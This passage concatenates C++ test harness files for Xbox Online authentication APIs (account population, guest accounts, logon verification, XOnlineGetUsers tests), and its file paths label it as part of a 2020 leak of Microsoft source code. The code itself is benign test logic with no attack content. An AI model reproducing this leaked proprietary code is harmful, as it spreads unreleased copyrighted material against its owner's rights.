            if (SUCCEEDED(hr))
            {
                // We count the number of accounts successfully created.
                *pCount += 1;
            }
            else
            {
                // This MU does not exist.  That's OK.
                hr = S_OK;
            }
        }
        CHECKRUN(CXLiveConnectionManager::Instance().Logoff());
    }

    hr = (SUCCEEDED(hr) && *pCount > 0) ? S_OK : E_FAIL;

    return hr;
}

HRESULT CXLiveUserManager::CreateAndSelectGuestAccount(const UserAccountIterator it, int guestNumber)
{
    if (m_numberOfSelectedAccounts >= XONLINE_MAX_LOGON_USERS)
    {
        return E_INVALIDARG;
    }

    // Copy the master account to the selected account array.
    m_selectedAccounts[ m_numberOfSelectedAccounts ] = *it;

    // Set the guest flag.  
    m_selectedAccounts[ m_numberOfSelectedAccounts ].xuid.dwUserFlags |= 
                        (guestNumber & XONLINE_USER_GUEST_MASK);

    ++m_numberOfSelectedAccounts;

    return S_OK;
}

HRESULT CXLiveUserManager::VerifyLogon(XONLINE_USER const *pLoggedUsers) const
{
    HRESULT hr = S_OK;

    if (NULL == pLoggedUsers)
    {
        hr = E_FAIL;
    }

    for (size_t i = 0; i < m_numberOfSelectedAccounts && SUCCEEDED(hr); ++i)
    {
        if (pLoggedUsers[i].xuid == 0)
        {
            // Skip empty slots.
            continue;
        }

        // Verify the HRESULT for this account.
        hr = pLoggedUsers[i].hr;

        // Verify the XUIDs.
        if (SUCCEEDED(hr))
        {
            hr = (pLoggedUsers[i].xuid == m_selectedAccounts[i].xuid) ? S_OK : E_FAIL;
        }

        // Verify the index.
        if (SUCCEEDED(hr))
        {
            int index = pLoggedUsers[i].index;
            hr = (index == i) ? S_OK : E_FAIL;
        }
    }

    return hr;
}

HRESULT CXLiveUserManager::GenerateAndSelectRandomAccounts( int hdMasterAccounts,
                                                            int hdGuestAccounts,
                                                            int muMasterAccounts,
                                                            int muGuestAccounts)
{
    HRESULT             hr              = S_OK;
    DWORD				dwUsers		= 0;
    DWORD               dwMUs = 0;

    // Make sure they didn't ask for too many accounts to be selected.
    if (SUCCEEDED(hr))
    {
        if (hdMasterAccounts + hdGuestAccounts + muMasterAccounts + muGuestAccounts > XONLINE_MAX_LOGON_USERS)
        {
            hr = E_INVALIDARG;
        }
    }

    // Make sure there is a master for every guest account.
    if (SUCCEEDED(hr))
    {
        if (hdGuestAccounts > 0 && hdMasterAccounts < 1 ||
           (muGuestAccounts > 0 && muMasterAccounts < 1))
        {
            hr = E_INVALIDARG;
        }
    }

    if (SUCCEEDED(hr))
    {
        // Delete any existing user accounts on the HD before populating.
        hr = COnlineAccounts::Instance()->PopulateUserAccountsHD( NULL, XONLINE_MAX_HD_ONLINE_USERS, true );
    }
    
    if (SUCCEEDED(hr))
    {
        // Create an account in every MU.
        hr = PopulateMUs(&dwMUs);
        hr = (SUCCEEDED(hr) && dwMUs > 0) ? S_OK : E_FAIL;
    }
        
    // Get the users.
    CHECKRUN(XOnlineGetUsers(m_users, &dwUsers));
    CHECKRUN((XONLINE_MAX_HD_ONLINE_USERS + dwMUs == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);

    // Generate the indexes.  This is required for the iterators to work.
    ComputeAccounts();
    ComputeHDAccounts();
    ComputeMUAccounts();
    
    // Verify that there are the correct number of users.
    CHECKRUN((CountMUAccounts() + CountHDAccounts() == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);
    CHECKRUN((CountAccounts() == dwUsers) ? hr : E_FAIL);

    // Verify that there are enough MUs.
    CHECKRUN(((int)dwMUs >= muMasterAccounts + muGuestAccounts) ? S_OK : E_INVALIDARG);

    // Verify that there are no duplicates.
    CHECKRUN((VerifyNoDuplicates()) ? S_OK : E_FAIL);
    
    // Clear account selections.
    CHECKRUN(ClearAccountSelections());

    // Select some HD master accounts to logon.
    HDAccountIterator hdIt = HDAccount_begin();
    if (SUCCEEDED(hr))
    {
        for (int i = 0; hdIt != HDAccount_end() && (i < hdMasterAccounts) && SUCCEEDED(hr); ++i)
        {
            hr = SelectAccount(hdIt++);
        }
    }
    
    // Select some HD guest accounts to logon.
    if (SUCCEEDED(hr))
    {
        for (int i = 0; (i < hdGuestAccounts) && SUCCEEDED(hr); ++i)
        {
            CHECKRUN(CreateAndSelectGuestAccount(hdIt, i));
        }
    }
    
    // Select some MU master accounts to logon.
    MUAccountIterator muIt = MUAccount_begin();
    if (SUCCEEDED(hr))
    {
        for (int i = 0; muIt != MUAccount_end() && (i < muMasterAccounts) && SUCCEEDED(hr); ++i)
        {
            hr = SelectAccount(muIt++);
        }
    }
    
    // Select some MU guest accounts to logon.
    if (SUCCEEDED(hr))
    {
        for (int i = 0; (i < muGuestAccounts) && SUCCEEDED(hr); ++i)
        {
            CHECKRUN(CreateAndSelectGuestAccount(muIt, i));
        }
    }
    
    return hr;
}


} // namespace XLive
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineCreateMachineAccount\XOnlineCreateMachineAccount.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineCreateMachineAccount.h
 *  Content:    XOnlineCreateMachineAccount utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/22/01    danrose Created to test Xbox XOnlineCreateMachineAccount
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <XOnlineAuthUtil.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAuthUtil\XOnlineAuthUtil.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineAuthUtil.cpp
 *  Content:    utility functions
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/22/01    danrose Created to test Xbox Online Auth apis
 *  01/05/02    davidhef Added IsUserDataEqual() and WaitForTask()
 *
 ****************************************************************************/

#include "XOnlineAuthUtil.h"

/****************************************************************************
 *
 *  CloseNetwork
 *
 *  Description:
 *      Utility function to close up the network
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT CloseNetwork( void )
{
	HRESULT				hr				= S_OK;

	RUN( XOnlineCleanup() );

	return hr;
}

/****************************************************************************
 *
 *  StartNetwork
 *
 *  Description:
 *      Utility function to start up the network
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT StartNetwork( void )
{
	HRESULT				hr				= S_OK;
	INT					iVal			= 0;
	DWORD				dwResult		= 0;
	WSADATA				wsaData;
	XNADDR				xnaddr;
	XNetStartupParams   xnsp;

	CHECKRUN( XOnlineStartup( NULL ) );

	//
	// wait for DNS to succeed
	//
	do
	{
		dwResult = XNetGetTitleXnAddr( &xnaddr );  	
	} 
	while ( XNET_GET_XNADDR_PENDING == dwResult );

	return hr;
}

/****************************************************************************
 *
 *  WaitForTask
 *
 *  Description:
 *      Utility function to wait for a task to finish
 *
 *  Arguments:
 *      (XONLINETASK_HANDLE taskHandle)
 *
 *  Returns:  
 *      HRESULT returned by XOnlineTaskContinue
 *
 ****************************************************************************/

HRESULT WaitForLogon( XONLINETASK_HANDLE taskHandle, HANDLE hEvent )
{
    HRESULT hr = S_OK;
    DWORD dwWait = 0;

    // Assume that the event passed in is auto-reset!
    
    do
    {   
        //
        // wait for data to be ready for processing
        //
        dwWait = WaitForSingleObject( hEvent, INFINITE );
        
        if ( WAIT_OBJECT_0 != dwWait )
        {
            hr = E_FAIL;

            if (!BVTMode())
            {
                ASSERT( SUCCEEDED( hr ) || !"wait failed!" );
            }

            return hr;
        }
        
        //
        // continue pumping the handle
        //
        hr = XOnlineTaskContinue( taskHandle );
    } while ( XONLINETASK_S_RUNNING == hr );
    
    return hr;
}


/****************************************************************************
 *
 *  IsUserDataEqual
 *
 *  Description:
 *      Utility function to compare two users' data
 *
 *  Arguments:
 *      (XONLINE_USER const& user1, XONLINE_USER const& user2)
 *
 *  Returns:  
 *      bool 
 *
 ****************************************************************************/

bool IsUserDataEqual(XONLINEP_USER const *pUser1, XONLINEP_USER const *pUser2)
{
    // We don't need to compare all elements.
    //
    if (pUser1->xuid == pUser2->xuid)
    {
        // Theoretically, we don't need to compare name or kingdom, but we 
        // do it because this is a test routine.
        if (memcmp((PVOID) &(pUser1->name), (PVOID) &(pUser2->name), sizeof(pUser1->name)) == 0)
        {
            if (memcmp((PVOID) &(pUser1->kingdom), (PVOID) &(pUser2->kingdom), sizeof(pUser1->kingdom)) == 0)
            {
                return true;
            }
        }
    }

    return false;
}

HRESULT DeleteAllUsersFromHD( void )
{
    XONLINE_USER users[XONLINE_MAX_STORED_ONLINE_USERS];
    HRESULT hr = S_OK;
    DWORD dwcUsers;
    DWORD dwcMUUsers = 0;
    
    ZeroMemory(users, sizeof(users));
    
    // Get the existing users.
    hr = XOnlineGetUsers(users, &dwcUsers);
    
    // Remove the existing users.
    for (DWORD i = 0; i < XONLINE_MAX_STORED_ONLINE_USERS && SUCCEEDED(hr); ++i)
    {
        if (users[ i ].xuid.qwUserID == (ULONGLONG) 0)
        {
            // Skip empty slots.
            continue;
        }

        if (users[ i ].dwUserOptions & XONLINE_USER_OPTION_CAME_FROM_MU)
        {
            // Skip user accounts from MUs.
            ++dwcMUUsers;
            continue;
        }

        hr = _XOnlineRemoveUserFromHD( users + i );
    }
    
    // Verify that there are no users.
    if (SUCCEEDED(hr))
    {
        hr = XOnlineGetUsers(users, &dwcUsers);
        hr = (SUCCEEDED(hr) && (0 == dwcUsers - dwcMUUsers)) ? S_OK : E_FAIL;
    }
    
    return hr;
}

bool BVTMode( void )
{
    return true;
}

CXOnlineTaskManager::CXOnlineTaskManager(DWORD dwTicks)
:
    m_defaultTicks(dwTicks)
{
    InitializeCriticalSection(&m_critSec);
}

CXOnlineTaskManager::~CXOnlineTaskManager()
{
    DeleteCriticalSection(&m_critSec);
}

HRESULT CXOnlineTaskManager::ManageTask(XONLINETASK_HANDLE taskHandle, HANDLE hEvent)
{
    TaskRec task(taskHandle, hEvent, m_defaultTicks);

    EnterCriticalSection(&m_critSec);
    m_taskList.push_back(task);
    LeaveCriticalSection(&m_critSec);

    return S_OK;
}

DWORD CountMUAccounts(XONLINE_USER const *pUsers)
{
    DWORD dwCount = 0;

    XONLINE_USER const *pEnd = pUsers + XONLINE_MAX_STORED_ONLINE_USERS;
    XONLINE_USER const *pCurrentUser = pUsers;

    for (; pCurrentUser < pEnd; ++pCurrentUser)
    {
        if (IsMUAccount(pCurrentUser))
            ++dwCount;
    }

    return dwCount;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetServiceInfo\XOnlineGetServiceInfo.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetServiceInfo.h
 *  Content:    XOnlineGetServiceInfo utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineGetServiceInfo
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <XOnlineAuthUtil.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetLogonUsers\XOnlineGetLogonUsers.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetLogonUsers.h
 *  Content:    XOnlineGetLogonUsers utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  01/04/02    davidhef Created to test Xbox XOnlineGetLogonUsers
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetUserFromMU\XOnlineGetUserFromMU.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetUserFromMU.h
 *  Content:    XOnlineGetUserFromMU utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   1/ 8/01    davidhef Created to test Xbox XOnlineGetUserFromMU
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xtestlib.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetUserFromMU\XOnlineGetUserFromMU.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetUserFromMU.cpp
 *  Content:    XOnlineGetUserFromMU tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   1/ 8/01    davidhef Created to test Xbox XOnlineGetUserFromMU
 *
 ****************************************************************************/

#include "XOnlineGetUserFromMU.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 *  XOnlineGetUserFromMU_BasicTest
 *
 *  Description:
 *      Basic Test for XOnlineGetUserFromMU
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetUserFromMU_BasicTest( void )
{
    HRESULT             hr              = S_OK;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetUserFromMU_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineGetUserFromMU tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetUserFromMU_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test XOnlineGetUserFromMU in the mannor it was meant to be called
    //

    if ( SHOULDRUNTEST( "XOnlineGetUserFromMU", "Basic" ) )
    {
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineGetUserFromMU", "Basic" );
        EXECUTE( XOnlineGetUserFromMU_BasicTest() );
    }

}

/****************************************************************************
 *
 *  XOnlineGetUserFromMU_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetUserFromMU_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineGetUserFromMU_StartTest( NULL );
    XOnlineGetUserFromMU_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineGetUserFromMU )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineGetUserFromMU )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineGetUserFromMU_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineGetUserFromMU_EndTest )
END_EXPORT_TABLE( XOnlineGetUserFromMU )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetLogonUsers\XOnlineGetLogonUsers.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetLogonUsers.cpp
 *  Content:    XOnlineGetLogonUsers tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  01/04/02    davidhef Created to test Xbox XOnlineGetLogonUsers
 *
 ****************************************************************************/

#include "XOnlineGetLogonUsers.h"
#include <XOnlineAuthUtil.h>
#include <CXLiveConnectionManager.h>
#include <CXLiveUserManager.h>

using XLive::CXLiveConnectionManager;
using XLive::CXLiveUserManager;
using XLive::CXLiveUserManager::MUAccountIterator;
using XLive::CXLiveUserManager::HDAccountIterator;


/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global array of services
 *
 ****************************************************************************/

static DWORD SERVICES[] = {
	    XONLINE_MATCHMAKING_SERVICE,
        XONLINE_BILLING_OFFERING_SERVICE
};   

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlineGetLogonUsers_NOT_LOGGED_IN
 *
	Description:
        Verify that the API returns NULL when XOnlineLogon has not been called.

    System State:
	    XOnlineLogon has not been called

    Verify:
	    NULL is returned

*
*****************************************************************************/

HRESULT XOnlineGetLogonUsers_NOT_LOGGED_IN ( void )
{
    HRESULT             hr              = E_FAIL;
    PXONLINE_USER       pUsers          = (PXONLINE_USER) 1234;

    pUsers = XOnlineGetLogonUsers();
    hr = (NULL == pUsers) ? S_OK : E_FAIL;

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetLogonUsers_LOGGED_IN
 *
	Description:
        Verify that the API returns a non-NULL pointer when XOnlineLogon has completed.

    System State:
	    XOnlineLogon has been called and has completed successfully

    Verify:
	    NULL is not returned


*
*****************************************************************************/

HRESULT XOnlineGetLogonUsers_BASIC_TEST ( void )
{
    HRESULT             hr              = S_OK;
    XONLINE_USER		users[XONLINE_MAX_STORED_ONLINE_USERS];
    PXONLINE_USER pUsers = NULL;
    DWORD dwMUs = 0;
    DWORD dwUsers = 0;
    
    // zero out the users
    ZeroMemory( users, sizeof( users ) );
    
    // populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) users, XONLINE_MAX_HD_ONLINE_USERS, true ) );
    
    if (SUCCEEDED(hr))
    {
        hr = CXLiveUserManager::PopulateMUs(&dwMUs);
        hr = (SUCCEEDED(hr) && dwMUs > 0) ? S_OK : E_FAIL;
    }

    // Get the number of existing accounts.
    CHECKRUN(XOnlineGetUsers(&users[0], &dwUsers));

    // Select services.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(&SERVICES[0], NUMELEMS(SERVICES)));
    
    // Instantiate helper class.
    CXLiveUserManager userMgr(&users[0]);

    // Verify the number of existing accounts.
    CHECKRUN((userMgr.CountMUAccounts() + userMgr.CountHDAccounts() == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);
    
    // Verify that there are no duplicates.
    CHECKRUN((userMgr.VerifyNoDuplicates()) ? S_OK : E_FAIL);
    
    // Clear account selections.
    CHECKRUN(userMgr.ClearAccountSelections());
    
    // Select a MU account to logon.
    if (SUCCEEDED(hr))
    {
        MUAccountIterator muIt = userMgr.MUAccount_begin();
        hr = (muIt != userMgr.MUAccount_end()) ? S_OK : E_FAIL;
        CHECKRUN(userMgr.SelectAccount(muIt));
    }
    
    // Select some HD accounts to logon.
    if (SUCCEEDED(hr))
    {
        int count = 1;              // We already selected a MU account.
        HDAccountIterator hdIt = userMgr.HDAccount_begin();
        for (; hdIt != userMgr.HDAccount_end() && count < XONLINE_MAX_LOGON_USERS && SUCCEEDED(hr); ++hdIt, ++count)
        {
            hr = userMgr.SelectAccount(hdIt);
        }
    }
    
    // Logon with selected users.  Services were selected above.
    if (SUCCEEDED(hr))
    {
        CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    }

    // Get the logged on users.
    if (SUCCEEDED(hr))
    {
        pUsers = XOnlineGetLogonUsers();
        hr = ( NULL == pUsers ) ? E_FAIL : S_OK;
    }
    
    // Verify the logon.
    CHECKRUN(userMgr.VerifyLogon(pUsers));
    
    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());
    
    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetLogonUsers_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineGetLogonUsers tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetLogonUsers_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    CHECKRUN( StartNetwork() );
    
    SETLOG( LogHandle, "davidhef", "Online", "XOnlineGetLogonUsers", "BASIC_TEST" );
    EXECUTE( XOnlineGetLogonUsers_BASIC_TEST() );
    
    if (!BVTMode())
    {
        //
        // Test XOnlineGetLogonUsers when not logged in
        //
        
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineGetLogonUsers", "NOT_LOGGED_IN" );
        EXECUTE( XOnlineGetLogonUsers_NOT_LOGGED_IN() );
    }
    
    CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlineGetLogonUsers_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetLogonUsers_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineGetLogonUsers_StartTest( NULL );
    XOnlineGetLogonUsers_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineGetLogonUsers )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineGetLogonUsers )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineGetLogonUsers_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineGetLogonUsers_EndTest )
END_EXPORT_TABLE( XOnlineGetLogonUsers )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetUsers\XOnlineGetUsers.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetUsers.h
 *  Content:    XOnlineGetUsers utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineGetUsers
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetUsers\XOnlineGetUsers.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetUsers.cpp
 *  Content:    XOnlineGetUsers tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineGetUsers
 *
 ****************************************************************************/

#include "XOnlineGetUsers.h"
#include <XOnlineAuthUtil.h>
#include <CXLiveConnectionManager.h>
#include <CXLiveUserManager.h>

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;


using XLive::CXLiveConnectionManager;
using XLive::CXLiveUserManager;
using XLive::CXLiveUserManager::MUAccountIterator;
using XLive::CXLiveUserManager::HDAccountIterator;
using XLive::CXLiveUserManager::AccountIterator;
using XLive::CXLiveUserManager::const_AccountIterator;


HRESULT XOnlineGetUsers_BASIC_TEST( void )
{
    HRESULT         hr = S_OK;
    XONLINE_USER    users[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER    aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    DWORD           dwUsers = 0;
    DWORD           dwMUs;
    static DWORD dwServices[] = {
            XONLINE_MATCHMAKING_SERVICE,
            XONLINE_BILLING_OFFERING_SERVICE,
            XONLINE_STATISTICS_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);
    int spinCount = (BVTMode()) ? 1 : 1000;
    
    
    
    // Use this to logon with no users.
    ZeroMemory(aIniUsers, sizeof(aIniUsers));

    // Select the services we'll request at logon time.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(dwServices, cServices));

    for (int i = 0; i < spinCount && SUCCEEDED(hr); ++i)
    {
        ZeroMemory(users, sizeof(users));
        
        if (SUCCEEDED(hr))
        {
            hr = COnlineAccounts::Instance()->PopulateUserAccountsHD((PXONLINEP_USER) users, XONLINE_MAX_HD_ONLINE_USERS);
        }
        
        if (SUCCEEDED(hr))
        {
            hr = CXLiveUserManager::PopulateMUs(&dwMUs);
            hr = (SUCCEEDED(hr) && dwMUs > 0) ? S_OK : E_FAIL;
        }
        
        // Get the users.
        CHECKRUN(XOnlineGetUsers(&users[0], &dwUsers));
        CHECKRUN((XONLINE_MAX_HD_ONLINE_USERS + dwMUs == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);
        
        CXLiveUserManager userMgr(&users[0]);
        CHECKRUN((userMgr.CountMUAccounts() + userMgr.CountHDAccounts() == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);

        // Verify that there are no duplicates.
        CHECKRUN((userMgr.VerifyNoDuplicates()) ? S_OK : E_FAIL);
        
        AccountIterator it = userMgr.Account_begin();
        for (; it != userMgr.Account_end(); ++it)
        {
            // Clear account selections.
            CHECKRUN(userMgr.ClearAccountSelections());
            
            // Select an account to logon.
            CHECKRUN(userMgr.SelectAccount(it));
            
            // Logon with selected user, then logoff.  Services were selected above.
            if (SUCCEEDED(hr))
            {
                CHECKRUN(CXLiveConnectionManager::Instance().Logon(userMgr.SelectedAccounts()));
                CHECKRUN(CXLiveConnectionManager::Instance().Logoff());
            }
        }

        // Now we will verify that users are returned in order of most recently
        // logged on to least recently logged on.
        XONLINE_USER orderedUsers[XONLINE_MAX_STORED_ONLINE_USERS];
        ZeroMemory(orderedUsers, sizeof(orderedUsers));

        // Get the users. They should be in opposite order than is found in
        // the users array.
        CHECKRUN(XOnlineGetUsers(&orderedUsers[0], &dwUsers));

        // Verify that there are the correct number of accounts.
        CXLiveUserManager orderedMgr(&orderedUsers[0]);
        CHECKRUN((orderedMgr.CountMUAccounts() + orderedMgr.CountHDAccounts() == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);
        
        // Check the order of accounts returned.
        it = userMgr.Account_begin();
        const_AccountIterator orderedIt = orderedMgr.Account_end();
        for (size_t j = 0; j < XONLINE_MAX_STORED_ONLINE_USERS && SUCCEEDED(hr); ++j)
        {
            hr = (*it++ == *--orderedIt) ? S_OK : E_FAIL;
        }
    }
    
    return hr;
}

HRESULT XOnlineGetUsers_NULL_USERS( void )
{
    HRESULT         hr = S_OK;
    DWORD           dwUsers = 0;
    XONLINE_USER    aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    static DWORD dwServices[] = {
            XONLINE_MATCHMAKING_SERVICE,
            XONLINE_BILLING_OFFERING_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);
    XONLINETASK_HANDLE	taskHandle = NULL; 
    int spinCount = (BVTMode()) ? 1 : 10;

    HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );
    if ( NULL == hEvent )
    {
        hr = E_FAIL;
    }
    
    // Use this to logon with no users.
    ZeroMemory(aIniUsers, sizeof(aIniUsers));

    // Logon with 0 users just to create a connection.
    CHECKRUN( XOnlineLogon((PXONLINE_USER) aIniUsers, dwServices, cServices, hEvent, &taskHandle) );
    if (SUCCEEDED(hr))
    {
        // Wait for logon to complete all initial work.
        hr = WaitForLogon(taskHandle, hEvent);
    }
    
    if (SUCCEEDED(hr))
    {
        hr = XOnlineGetUsers(NULL, &dwUsers);
        hr = (SUCCEEDED(hr)) ? E_FAIL : S_OK;
    }
    
    if (NULL != hEvent)
    {
        hr = (CloseHandle(hEvent)) ? hr : E_FAIL;
        hEvent = NULL;
    }

    if (taskHandle)
    {
        hr = XOnlineTaskClose( taskHandle );
        taskHandle = NULL;
    }

    return hr;
}

HRESULT XOnlineGetUsers_NULL_COUNT( void )
{
    HRESULT         hr = S_OK;
    XONLINE_USER    users[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER    aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    static DWORD dwServices[] = {
            XONLINE_MATCHMAKING_SERVICE,
            XONLINE_BILLING_OFFERING_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);
    XONLINETASK_HANDLE	taskHandle = NULL; 
